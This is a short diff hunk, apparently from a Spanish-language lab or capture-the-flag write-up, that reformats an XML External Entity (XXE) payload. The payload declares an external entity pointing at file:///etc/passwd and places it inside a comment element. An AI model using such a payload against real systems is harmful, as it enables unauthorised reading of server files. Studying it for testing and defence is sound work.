@@ -61,5 +61,7 @@ parece que tenemos un archivo xml
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> 
 <comment> 
 <name>Joe Hamd</name> 
-<author>Barry Clad</author> <com>&test; </com> </comment>
+<author>Barry Clad</author> 
+<com>&test; </com> 
+</comment>
 ```
